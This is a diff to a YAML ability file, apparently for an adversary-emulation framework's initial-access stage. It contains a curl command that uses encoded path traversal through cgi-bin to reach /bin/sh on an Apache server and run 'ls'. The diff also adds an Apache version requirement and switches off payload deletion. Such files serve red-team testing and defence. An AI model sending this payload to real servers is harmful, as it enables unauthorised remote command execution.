@@ -6,8 +6,7 @@
   executors:
   - name: sh
     platform: linux
-    command: ' curl ''http://#{target.ip}/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'' -d
-      ''A=|echo;ls'''
+    command: ' curl "http://#{target.ip}/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "A=|echo;ls"'
     code: null
     language: null
     build_target: null
@@ -17,21 +16,27 @@
     parsers:
     - module: plugins.stockpile.parser.basic
       parserconfigs:
-      - source: files
+      - source: target.files
         edge: ''
         target: ''
         custom_parser_vals: {}
     cleanup: []
     variations: []
     additional_info: {}
-  requirements: []
+  requirements:
+  - module: plugins.stockpile.app.requirements.hasapachv
+    relationship_match:
+    - source: target.ip
+      edge: has_version
+      target: apache.version
   privilege: ''
   repeatable: false
   buckets:
   - initial-access
-  additional_info: {}
+  additional_info:
+    selected: 'True'
   access: {}
   singleton: true
   plugin: ''
-  delete_payload: true
+  delete_payload: false
   id: 094fd657-476c-469e-85c7-026be4d095b6
